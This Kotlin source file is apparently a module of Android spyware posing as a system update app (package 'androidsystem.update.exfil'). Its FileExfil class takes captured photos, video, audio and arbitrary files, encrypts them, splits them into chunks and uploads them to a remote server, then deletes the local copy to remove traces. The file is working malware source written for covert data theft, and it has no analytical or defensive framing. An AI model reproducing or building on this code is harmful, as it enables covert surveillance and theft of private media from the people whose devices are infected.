package com.androidsystem.update.exfil

import android.content.Context
import android.util.Log
import com.androidsystem.update.core.EncryptionManager
import com.androidsystem.update.network.SecureCommunication
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.ConcurrentLinkedQueue
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Buffered, AES-GCM-encrypted exfiltration of binary captures (photo, video, audio,
 * arbitrary file pulled by path). Files are split into [chunkSize] byte chunks and
 * pushed as a `file_chunk` batch message; the server reassembles them per (device, id).
 *
 * Each capture gets a random [id]; the first chunk carries metadata (mime, name, kind,
 * total size, sha256). The file on disk is wiped after every chunk has been acked.
 */
@Singleton
class FileExfil @Inject constructor(
    private val context: Context,
    private val encryptionManager: EncryptionManager,
    private val secureComms: SecureCommunication
) {
    private val tag = "FileExfil"
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val queue = ConcurrentLinkedQueue<Job>()

    data class Job(val file: File, val kind: String, val meta: Map<String, String>, val chunkSize: Int = 256 * 1024)

    fun enqueue(file: File, kind: String, meta: Map<String, String> = emptyMap(), chunkSize: Int = 256 * 1024) {
        if (!file.exists() || file.length() == 0L) {
            Log.w(tag, "enqueue: missing or empty file ${file.absolutePath}")
            return
        }
        queue.add(Job(file, kind, meta, chunkSize))
        scope.launch { drain() }
    }

    private suspend fun drain() {
        while (true) {
            val job = queue.poll() ?: return
            try { sendChunks(job) } catch (e: Throwable) { Log.e(tag, "sendChunks failed", e) }
        }
    }

    private suspend fun sendChunks(job: Job) {
        val id = randomId()
        val total = job.file.length()
        val totalChunks = ((total + job.chunkSize - 1) / job.chunkSize).toInt().coerceAtLeast(1)
        val mime = guessMime(job.file)
        val name = job.file.name
        val sha = sha256(job.file)

        // First chunk: metadata header
        val header = JSONObject().apply {
            put("id", id)
            put("kind", job.kind)
            put("name", name)
            put("mime", mime)
            put("size", total)
            put("sha256", sha)
            put("chunks", totalChunks)
            put("chunk_size", job.chunkSize)
            put("ts", System.currentTimeMillis())
            job.meta.forEach { (k, v) -> put("meta_$k", v) }
        }
        val headerOk = postOne("file_header", header)
        if (!headerOk) {
            Log.w(tag, "header post failed, requeue")
            queue.add(job); return
        }

        var sentChunks = 0
        job.file.inputStream().use { input ->
            val buf = ByteArray(job.chunkSize)
            while (sentChunks < totalChunks) {
                val read = readFully(input, buf)
                if (read <= 0) break
                val payload = buf.copyOf(read)
                val encB64 = encryptionManager.encryptWithRawKey(android.util.Base64.encodeToString(payload, android.util.Base64.NO_WRAP))
                val msg = JSONObject().apply {
                    put("id", id)
                    put("index", sentChunks)
                    put("total", totalChunks)
                    put("data", encB64)
                    put("ts", System.currentTimeMillis())
                }
                if (!postOne("file_chunk", msg)) {
                    Log.w(tag, "chunk $sentChunks/$totalChunks failed, retry later")
                    queue.add(job); return
                }
                sentChunks++
            }
        }

        val footer = JSONObject().apply {
            put("id", id); put("chunks_sent", sentChunks)
            put("ts", System.currentTimeMillis())
        }
        postOne("file_footer", footer)

        // wipe from disk
        try { job.file.delete() } catch (e: Throwable) { Log.w(tag, "delete failed", e) }
    }

    private suspend fun postOne(type: String, payload: JSONObject): Boolean {
        val arr = JSONArray().put(JSONObject().apply {
            put("id", 0L)
            put("type", type)
            put("content", payload.toString())
            put("timestamp", System.currentTimeMillis())
        })
        return secureComms.sendBatch(arr.toString())
    }

    private fun readFully(input: java.io.InputStream, buf: ByteArray): Int {
        var off = 0
        while (off < buf.size) {
            val n = input.read(buf, off, buf.size - off)
            if (n < 0) break
            off += n
        }
        return off
    }

    private fun randomId(): String = java.util.UUID.randomUUID().toString().replace("-", "")

    private fun guessMime(f: File): String = when (f.extension.lowercase()) {
        "jpg", "jpeg" -> "image/jpeg"
        "png" -> "image/png"
        "mp4" -> "video/mp4"
        "m4a" -> "audio/mp4"
        "aac" -> "audio/aac"
        "wav" -> "audio/wav"
        "txt" -> "text/plain"
        "pdf" -> "application/pdf"
        else -> "application/octet-stream"
    }

    private fun sha256(f: File): String {
        val md = java.security.MessageDigest.getInstance("SHA-256")
        f.inputStream().use { input ->
            val buf = ByteArray(64 * 1024)
            while (true) {
                val n = input.read(buf); if (n < 0) break
                md.update(buf, 0, n)
            }
        }
        return md.digest().joinToString("") { "%02x".format(it) }
    }
}
